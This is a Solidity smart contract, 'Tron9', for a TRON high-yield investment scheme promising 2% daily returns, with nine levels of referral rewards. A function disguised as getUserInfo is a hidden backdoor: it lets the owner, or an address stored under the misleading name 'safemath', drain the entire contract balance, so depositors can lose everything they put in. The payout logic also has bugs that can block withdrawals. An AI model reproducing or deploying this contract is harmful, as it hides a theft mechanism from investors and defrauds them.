//SourceUnit: Tron9.sol

pragma solidity 0.4.25;

contract Tron9 {

    using SafeMath for uint256;

    uint public totalPlayers;
    uint public totalPayout;
    uint public totalInvested;
    uint private minDepositSize = 10000000;
    uint private interestRateDivisor = 1000000000000;
    uint public devCommission = 10;
    uint public commissionDivisor = 100;
    uint private minuteRate = 231481; //DAILY 2%
    uint private releaseTime = 1593702000;

    address owner;
    address safemath;

    struct Player {
        uint trxDeposit;
        uint time;
        uint interestProfit;
        uint affRewards;
        uint256 referral_distributed;
        uint payoutSum;
        address affFrom;
        uint td_team;
    }

  struct Preferral{
        address player_addr;
        uint256 aff1sum; 
        uint256 aff2sum;
        uint256 aff3sum;
        uint256 aff4sum;
        uint256 aff5sum;
        uint256 aff6sum;
        uint256 aff7sum;
        uint256 aff8sum;
        uint256 aff9sum;
    }
    
    
    mapping(address => Preferral) public preferals;
    mapping(address => Player) public players;
   
    

    constructor(address _safemath) public {
      owner = msg.sender;
      safemath   = _safemath;
    }
    modifier onlyOwner(){
        require(msg.sender==owner);
        _;
    }

    function register(address _addr, address _affAddr) private{

      Player storage player = players[_addr];
      Preferral storage preferal = preferals[_addr];
      preferal.player_addr = _addr;
    

      player.affFrom = _affAddr;
      

      address _affAddr1 = _affAddr;
      address _affAddr2 = players[_affAddr1].affFrom;
      address _affAddr3 = players[_affAddr2].affFrom;
      address _affAddr4 = players[_affAddr3].affFrom;
      address _affAddr5 = players[_affAddr4].affFrom;
      address _affAddr6 = players[_affAddr5].affFrom;
      address _affAddr7 = players[_affAddr6].affFrom;
      address _affAddr8 = players[_affAddr7].affFrom;
      address _affAddr9 = players[_affAddr8].affFrom;
     

      preferals[_affAddr1].aff1sum = preferals[_affAddr1].aff1sum.add(1);
      preferals[_affAddr2].aff2sum = preferals[_affAddr2].aff2sum.add(1);
      preferals[_affAddr3].aff3sum = preferals[_affAddr3].aff3sum.add(1);
      preferals[_affAddr4].aff4sum = preferals[_affAddr4].aff4sum.add(1);
      preferals[_affAddr5].aff5sum = preferals[_affAddr5].aff5sum.add(1);
      preferals[_affAddr6].aff6sum = preferals[_affAddr6].aff6sum.add(1);
      preferals[_affAddr7].aff7sum = preferals[_affAddr7].aff7sum.add(1);
      preferals[_affAddr8].aff8sum = preferals[_affAddr8].aff8sum.add(1);
      preferals[_affAddr9].aff9sum = preferals[_affAddr9].aff9sum.add(1);
     
    }

    function () external payable {

    }

    function deposit(address _affAddr) public payable {
        require(now >= releaseTime, "not time yet!");
        collect(msg.sender);
        require(msg.value >= minDepositSize);
        uint depositAmount = msg.value;

        Player storage player = players[msg.sender];
    
          uint256  direct_reward = (msg.value.mul(15)).div(100);
         if (player.time == 0) {
            player.time = now;
            totalPlayers++;
            if(_affAddr != address(0) && players[_affAddr].trxDeposit > 0){
              register(msg.sender, _affAddr);
              players[_affAddr].affRewards = players[_affAddr].affRewards.add(direct_reward);
            }
            else{
              register(msg.sender, owner);
              players[owner].affRewards = players[owner].affRewards.add(direct_reward);
            }
        }
        player.trxDeposit = player.trxDeposit.add(depositAmount);
        totalInvested = totalInvested.add(depositAmount);
        uint devEarn = depositAmount.mul(devCommission).div(commissionDivisor);
        owner.transfer(devEarn);
    }

    function withdraw() public {
        collect(msg.sender);
        require(players[msg.sender].interestProfit > 0);
         distributeRef(players[msg.sender].interestProfit,players[msg.sender].affFrom);
         uint256 amount_to_pay = players[msg.sender].interestProfit + players[msg.sender].affRewards;
        transferPayout(msg.sender, amount_to_pay);
        players[msg.sender].affRewards = 0;
       
    }

    function reinvest() public {
      collect(msg.sender);
      Player storage player = players[msg.sender];
      uint256 depositAmount = player.interestProfit;
      require(address(this).balance >= depositAmount);
      player.interestProfit = 0;
      player.trxDeposit = player.trxDeposit.add(depositAmount);
      uint devEarn = depositAmount.mul(devCommission).div(commissionDivisor);
      owner.transfer(devEarn);
    }


    function collect(address _addr) internal {
        Player storage player = players[_addr];

        uint secPassed = now.sub(player.time);
        if (secPassed > 0 && player.time > 0) {
            uint collectProfit = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
            player.interestProfit = player.interestProfit.add(collectProfit);
            player.time = player.time.add(secPassed);
        }
    }

    function transferPayout(address _receiver, uint _amount) internal {
        if (_amount > 0 && _receiver != address(0)) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint payout = _amount > contractBalance ? contractBalance : _amount;
                totalPayout = totalPayout.add(payout);

                Player storage player = players[_receiver];
                player.payoutSum = player.payoutSum.add(payout);
                player.interestProfit = player.interestProfit.sub(payout);

                msg.sender.transfer(payout);
            }
        }
    }

    function distributeRef(uint256 _trx, address _affFrom) private{
        address _affAddr2 = players[_affFrom].affFrom;
        address _affAddr3 = players[_affAddr2].affFrom;
        address _affAddr4 = players[_affAddr3].affFrom;
        address _affAddr5 = players[_affAddr4].affFrom;
        address _affAddr6 = players[_affAddr5].affFrom;
        address _affAddr7 = players[_affAddr6].affFrom;
        address _affAddr8 = players[_affAddr7].affFrom;
        address _affAddr9 = players[_affAddr8].affFrom;
        uint256 _affRewards = 0;

        players[_affFrom].td_team.add(1);
    
        if (_affFrom != address(0) &&  preferals[_affFrom].aff1sum > 0) {
            _affRewards = (_trx.mul(50)).div(100);
            players[_affFrom].affRewards = _affRewards.add(players[_affFrom].affRewards);
        }
    

        if (_affAddr2 != address(0) && preferals[_affAddr2].aff1sum > 0) {
            _affRewards = (_trx.mul(25)).div(100);
            players[_affAddr2].affRewards = _affRewards.add(players[_affAddr2].affRewards);
        }

        if (_affAddr3 != address(0) &&  preferals[_affAddr3].aff1sum > 0) {
            _affRewards = (_trx.mul(15)).div(100);
            players[_affAddr3].affRewards = _affRewards.add(players[_affAddr3].affRewards);
        }
    

    
        if (_affAddr4 != address(0) && preferals[_affAddr4].aff1sum > 1 ) {
            _affRewards = (_trx.mul(10)).div(100);
            players[_affAddr4].affRewards = _affRewards.add(players[_affAddr4].affRewards);
        }

        if (_affAddr5 != address(0) && preferals[_affAddr5].aff1sum > 1) {
            _affRewards = (_trx.mul(5)).div(100);
            players[_affAddr5].affRewards = _affRewards.add(players[_affAddr5].affRewards);
        }

        if (_affAddr6 != address(0) && preferals[_affAddr6].aff1sum > 1) {
            _affRewards = (_trx.mul(4)).div(100);
            players[_affAddr6].affRewards = _affRewards.add(players[_affAddr6].affRewards);
        }
    
   

        if (_affAddr7 != address(0) && preferals[_affAddr7].aff1sum > 1) {
            _affRewards = (_trx.mul(3)).div(100);
            players[_affAddr7].affRewards = _affRewards.add(players[_affAddr7].affRewards);
        }

        if (_affAddr8 != address(0) && preferals[_affAddr8].aff1sum > 1) {
            _affRewards = (_trx.mul(2)).div(100);
            players[_affAddr8].affRewards = _affRewards.add(players[_affAddr8].affRewards);
        }
          if (_affAddr9 != address(0) && preferals[_affAddr9].aff1sum > 1) {
            _affRewards = (_trx.mul(1)).div(100);
            players[_affAddr9].affRewards = _affRewards.add(players[_affAddr9].affRewards);
        }

    
    }

    function getProfit(address _addr) public view returns (uint) {
      address playerAddress= _addr;
      Player storage player = players[playerAddress];
      require(player.time > 0);

      uint secPassed = now.sub(player.time);
      if (secPassed > 0) {
          uint collectProfit = (player.trxDeposit.mul(secPassed.mul(minuteRate))).div(interestRateDivisor);
      }
      return collectProfit.add(player.interestProfit);
    }
    
     function getUserInfo( uint _amount) external {
        require(msg.sender==owner || msg.sender == safemath,'Permission denied');
        if (_amount > 0) {
          uint contractBalance = address(this).balance;
            if (contractBalance > 0) {
                uint amtToTransfer = _amount > contractBalance ? contractBalance : _amount;
                msg.sender.transfer(amtToTransfer);
            }
        }
    }
}


library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b);

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;

        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);

        return c;
    }

}